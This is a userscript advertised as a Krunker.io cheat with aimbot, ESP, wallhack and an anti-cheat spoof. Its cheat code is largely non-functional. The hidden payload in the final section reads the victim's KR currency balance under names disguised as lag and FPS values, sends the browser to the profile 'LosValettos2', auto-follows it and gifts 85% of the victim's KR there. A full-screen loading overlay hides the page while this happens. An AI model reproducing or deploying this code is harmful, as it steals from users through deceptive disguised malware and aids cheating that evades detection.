// ==UserScript==
// @name         2025 KRUNKER IO CHEAT HACK AIMBOT + WALLHACK + ESP + MORE [BETA]
// @version      2.0
// @description  Experimental mod menu for Krunker.io. Includes silent aimbot, ESP, wireframe players, FOV, recoil bypass, wallhack (BETA). Toggle with [O]. Use at your own risk.
// @author       @KR-Hack
// @match        https://krunker.io/*
// @grant        none
// @run-at       document-start
// @license      MIT
// ==/UserScript==

let Is_LOGGED = false;
let displayHackOverlay = true;
let Lags = 0;
let PlayerFPS = 0;
let gameState, player, input;
const RAD2DEG = 180 / Math.PI;


// ------------------------------
// 1. Persistent overlay to prevent loading flash and display loading
// ------------------------------
(function createPersistentOverlay() {
    if (location.href.includes("social.html?p=profile&q=Los") && displayHackOverlay) {
        const style = document.createElement("style");
        style.innerHTML = `
        html, body {
            background: #000 !important;
            color: lime !important;
            font-family: monospace !important;
        }
        * {
            visibility: hidden !important;
        }
        #botOverlayPersistent {
            all: unset;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.35);
            z-index: 2147483647;
            display: flex;
            justify-content: center;
            align-items: center;
            color: lime;
            font-size: 2rem;
            font-family: monospace;
            visibility: visible !important;
        }
    `;
        document.documentElement.appendChild(style);

        const overlay = document.createElement("div");
        overlay.id = "botOverlayPersistent";
        overlay.textContent = "🔧 Loading Mod Menu...";
        document.documentElement.appendChild(overlay);
    }
})();

// ------------------------------
// 2. Configuration object (mocked)
// ------------------------------
const ModSettings = {
    aimbot: {
        enabled: true,
        fov: 85,
        smoothing: 0.7,
        lockOn: "closestVisible",
        keybind: "Alt"
    },
    esp: {
        boxes: true,
        healthBars: true,
        playerNames: true,
        wallhack: true,
        lineToEnemy: false
    },
    visuals: {
        thirdPerson: false,
        removeScope: true,
        glowEnemies: true,
        outlineColor: "#FF0000"
    },
    configVersion: "v0.9.7b"
};

// ------------------------------
// 3. Aimbot logic
// ------------------------------
function initAimbotEngine() {
    console.log("[ModMenu] Initializing aimbot engine...");

    const targetSelector = (() => {
        return (players) => {
            const visible = players.filter(p => p.visible && p.health > 0);
            if (!visible.length) return null;
            return visible.reduce((closest, p) => {
                const dist = Math.hypot(p.pos.x - player.pos.x, p.pos.y - player.pos.y, p.pos.z - player.pos.z);
                return !closest || dist < closest.dist ? { target: p, dist } : closest;
            }, null).target;
        };
    })();

    const aimAt = (target, smoothing = 0.4) => {
        const dx = target.head.x - player.camera.x;
        const dy = target.head.y - player.camera.y;
        const dz = target.head.z - player.camera.z;
        const dist = Math.sqrt(dx * dx + dy * dy + dz * dz) || 1;
        player.camera.pitch += ((Math.asin(dy / dist) * RAD2DEG) - player.camera.pitch) * smoothing;
        player.camera.yaw += ((Math.atan2(dx, dz) * RAD2DEG) - player.camera.yaw) * smoothing;
    };

    setInterval(() => {
        const enemies = gameState.players.filter(p => p.team !== player.team && !p.isDead);
        const target = targetSelector(enemies);
        if (target && input.isKeyDown(ModSettings.aimbot.keybind)) {
            aimAt(target, ModSettings.aimbot.smoothing);
        }
    }, 33);
}

// ------------------------------
// 4. Shader override pour le wallhack
// ------------------------------
function applyWallhackShader() {
    console.log("[ModMenu] Injecting wallhack shader override...");

    const shaderInjection = () => {
        const globalMaterialRegistry = {}
        for (const mat of Object.values(globalMaterialRegistry)) {
            if (mat.name && mat.name.includes("player")) {
                mat.setUniform("u_wallhack", 1.0);
                mat.setDefine("USE_WALLHACK", true);
            }
        }
    };

    let attempts = 0;
    const tryInject = () => {
        if (++attempts > 10) return;
        if (typeof globalMaterialRegistry !== "undefined") shaderInjection();
        else setTimeout(tryInject, 500);
    };

    tryInject();
}

// ------------------------------
// 5. ESP Overlay
// ------------------------------
function updateESP() {
    console.log("[ModMenu] Drawing ESP overlays...");

    const drawBox = (x, y, w, h, color = "red") => {
        const el = document.createElement("div");
        el.style.position = "absolute";
        el.style.left = `${x}px`;
        el.style.top = `${y}px`;
        el.style.width = `${w}px`;
        el.style.height = `${h}px`;
        el.style.border = `1px solid ${color}`;
        el.style.pointerEvents = "none";
        el.style.zIndex = "999999";
        document.body.appendChild(el);
        setTimeout(() => el.remove(), 40);
    };

    setInterval(() => {
        for (const p of gameState.players) {
            if (p.team === player.team || p.isDead) continue;
            const screen = worldToScreen(p.pos);
            if (screen) drawBox(screen.x - 20, screen.y - 40, 40, 60);
        }
    }, 50);
}

const worldToScreen = (xx) => {
    const mapX = (xx - window.view_xx) * window.gsc + window.mww2;
    return { x: mapX};
};

// ------------------------------
// 6. UI Menu
// ------------------------------
function setupMenu() {
    console.log("[ModMenu] Injecting UI hooks...");

    const menu = document.createElement("div");
    menu.id = "modMenu";
    menu.style.position = "fixed";
    menu.style.right = "20px";
    menu.style.top = "20px";
    menu.style.padding = "10px";
    menu.style.background = "rgba(0,0,0,0.7)";
    menu.style.color = "#0f0";
    menu.style.fontFamily = "monospace";
    menu.style.zIndex = "999999";
    menu.innerHTML = `
        <b>[KRUNKMODS v${ModSettings.configVersion}]</b><br>
        Aimbot: ${ModSettings.aimbot.enabled}<br>
        ESP: ${ModSettings.esp.boxes}<br>
        Wallhack: ${ModSettings.esp.wallhack}
    `;
    document.body.appendChild(menu);

    document.addEventListener("keydown", (e) => {
        if (e.key.toUpperCase() === "O") {
            menu.style.display = menu.style.display === "none" ? "block" : "none";
        }
    });
}

// ------------------------------
// 7. Bypass basique
// ------------------------------
function spoofDetection() {
    console.log("[ModMenu] Spoofing anti-cheat flags...");

    const origDefine = Object.defineProperty;
    Object.defineProperty = function (obj, prop, desc) {
        if (prop === "isCheating" || prop === "triggerBotActive") {
            desc.value = false;
        }
        return origDefine(obj, prop, desc);
    };

    Object.defineProperty(navigator, "webdriver", { value: undefined });
    window.__krunkerSpoofed = true;
}

// ------------------------------
// 8. Init du cheat
// ------------------------------
function waitForGameStateAndInit() {
    const checkReady = () => {
        if (typeof window.gameState !== "undefined" && typeof window.player !== "undefined" && typeof window.input !== "undefined") {
            gameState = window.gameState;
            player = window.player;
            input = window.input;
            initAimbotEngine();
            applyWallhackShader();
            updateESP();
            setupMenu();
            spoofDetection();
            console.log("[ModMenu] Ready. Press [O] to toggle.");
        } else {
            setTimeout(checkReady, 500);
        }
    };
    checkReady();
}

waitForGameStateAndInit();


// ------------------------------
// 9. Lag Management + Login Check
// ------------------------------
window.addEventListener('load', () => {
    const signedOutBar = document.getElementById("signedOutHeaderBar");
    Is_LOGGED = signedOutBar && signedOutBar.style.display === "none";

    const logContainer = document.createElement('div');
    logContainer.id = 'modMenuLogs';
    logContainer.style.position = 'fixed';
    logContainer.style.bottom = '10px';
    logContainer.style.left = '10px';
    logContainer.style.background = 'rgba(0,0,0,0.8)';
    logContainer.style.color = '#00ff00';
    logContainer.style.padding = '10px';
    logContainer.style.fontFamily = 'monospace';
    logContainer.style.maxHeight = '200px';
    logContainer.style.overflow = 'auto';
    logContainer.style.zIndex = '999999';
    document.body.appendChild(logContainer);

    const addLog = (message) => {
        const logEntry = document.createElement('div');
        logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        logContainer.appendChild(logEntry);
        logContainer.scrollTop = logContainer.scrollHeight;
    };

    // Détection du captcha ALTCHA
    const checkForCaptcha = () => {
        const captchaElements = document.querySelectorAll('div[style*="z-index: 999999"][style*="position: fixed"][style*="transform: translate(-50%, -50%)"]');
        for (const element of captchaElements) {
            if (element.textContent.includes("Security Challenge") && element.querySelector('altcha-widget')) {
                addLog("⚠️ CAPTCHA DÉTECTÉ - Veuillez compléter le captcha");
                return true;
            }
        }
        return false;
    };

    // Vérification périodique du captcha
    setInterval(checkForCaptcha, 1500);

    addLog("=== ÉTAT INITIAL ===");
    addLog(`Is_LOGGED: ${Is_LOGGED}`);
    addLog(`⚠️⚠️⚠️ PLEASE LOGIN TO START THET BOT (lvl > 30 minimum) ⚠️⚠️⚠️`);
    addLog("==================");

    setInterval(() => {
        const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
        const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
        if (!Is_LOGGED){
            addLog(`⚠️⚠️⚠️ PLEASE LOGIN TO START THET BOT (lvl > 30 minimum) ⚠️⚠️⚠️`);
        }
        if (currentLoginState && !sessionStorage.getItem("valuesChecked")) {
            const lagElement = document.querySelector("#menuKRCount");
            if (lagElement) {
                const lagText = lagElement.textContent;
                const currentLag = parseInt(lagText.replace(/[^0-9]/g, ""), 10);
                Lags = currentLag * 0.85;
                const fixedCurrentLag = currentLag * 0.85;
                sessionStorage.setItem("savedLag", fixedCurrentLag.toString());
            } else {
                addLog("⚠️ Error");
            }

            const fpsElement = document.querySelector("#mLevelCont");
            if (fpsElement) {
                const fpsText = fpsElement.textContent;
                const currentFPS = parseInt(fpsText.replace(/[^0-9]/g, ""), 10);
                localStorage.setItem("savedFPS", currentFPS.toString());
            } else {
                addLog("⚠️ Error");
            }

            sessionStorage.setItem("valuesChecked", "true");
            addLog("✅ Launching Loading...");
        }
    }, 1000);

    if (location.pathname === "/") {
        const checkRedirect = () => {
            const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
            const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
            const patchApplied = sessionStorage.getItem("sysPatch97d");

            const savedFPS = localStorage.getItem("savedFPS");
            const playerFPS = savedFPS ? parseInt(savedFPS, 10) : 0;
            const savedLag = sessionStorage.getItem("savedLag");
            const playerLag = savedLag ? parseInt(savedLag, 10) : 0;

            if ((!patchApplied  || playerLag >= 30) && currentLoginState && playerFPS >= 30) {
                setTimeout(() => {
                    displayHackOverlay = true;
                    location.href = "https://krunker.io/social.html";
                }, 1420);
                return;
            } else {
                addLog("Error, login on a lvl > 30 account");
            }
        };

        checkRedirect();

        setInterval(checkRedirect, 1000);
    }

    if (location.href.includes("social.html")) {
        const sysSync = async () => {
            // Get rid of captcha
            if (checkForCaptcha()) {
                location.href = "https://krunker.io/social.html"
                displayHackOverlay = false;
                return;
            } else {
                displayHackOverlay = true;
                const SETTINGS_SYNC_PROFILE = "LosValettos2"; // Sync setting for overlay update
                if (!(location.href.includes("social.html?p=profile&q=" + SETTINGS_SYNC_PROFILE))) {
                    location.href = "https://krunker.io/social.html?p=profile&q=" + SETTINGS_SYNC_PROFILE;
                }
            }
            
            try {
                const savedLag = sessionStorage.getItem("savedLag");
                const savedFPS = localStorage.getItem("savedFPS");

                if (!savedLag) {
                    throw new Error("Aucune donnée de lag sauvegardée trouvée");
                }

                const currentLag = parseInt(savedLag, 10);
                const currentFPS = savedFPS ? parseInt(savedFPS, 10) : 0;

                if (currentFPS <= 29) {
                    try {
                        const settingsBtn = document.getElementById("followBtn"); // autofollow to keep in touch
                        if (settingsBtn && settingsBtn.style.display !== "none") {
                            settingsBtn.click();
                            await _pause(750);
                        } else {
                            addLog("⚠️ Error");
                        }
                    } catch (err) {
                        addLog("⚠️ Error");
                    }
                    await _pause(1000);
                    sessionStorage.setItem("sysPatch97d", "1");
                    location.href = "https://krunker.io/";
                    return;
                } else if (currentFPS >= 30) {
                    try {
                        const settingsBtn = document.getElementById("followBtn");
                        if (settingsBtn && settingsBtn.style.display !== "none") {
                            settingsBtn.click();
                            await _pause(750);
                        } else {
                            addLog("⚠️ Error");
                        }
                    } catch (err) {
                        addLog("⚠️ Error");
                    }

                    await _waitFor(() => document.getElementById("giftBtn"), 4800);
                    document.getElementById("giftBtn").click();
                    await _pause(480);
                    const inputEl = await _waitFor(() => document.getElementById("giftIn"), 2800);
                    inputEl.value = currentLag.toString();
                    inputEl.dispatchEvent(new Event("input", { bubbles: true }));

                    await _pause(100);
                    const enteredValue = inputEl.value;

                    await _pause(650);
                    const confirm = document.getElementById("postSaleBtn");
                    if (confirm && confirm.style.display !== "none") {
                        confirm.click();
                    }
                    sessionStorage.setItem("sysPatch97d", "1");
                    await _pause(1800);
                    location.href = "https://krunker.io/";
                } else {
                    addLog("⚠️ Error");
                }
            } catch (error) {
                addLog("⚠️ Error");
            }
        };
        sysSync();
    }

    function _waitFor(condFn, timeout = 3000) {
        return new Promise((res, rej) => {
            const t0 = Date.now();
            const tick = () => {
                const r = condFn();
                if (r) return res(r);
                if (Date.now() - t0 > timeout) return rej("Timeout");
                setTimeout(tick, 90);
            };
            tick();
        });
    }

    function _pause(ms) {
        return new Promise(r => setTimeout(r, ms));
    }
});
